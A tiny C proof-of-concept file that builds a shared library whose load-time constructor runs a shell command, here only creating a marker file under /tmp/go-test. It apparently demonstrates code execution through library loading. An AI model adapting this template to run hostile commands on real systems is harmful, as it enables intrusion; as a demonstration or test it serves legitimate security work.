#include <stdio.h>
#include <stdlib.h>

/*
build: gcc -shared -o poc.so -fPIC poc.c
*/

static void plugon() __attribute__((constructor));
void plugon() {
    system("touch /tmp/go-test/success.txt");
}
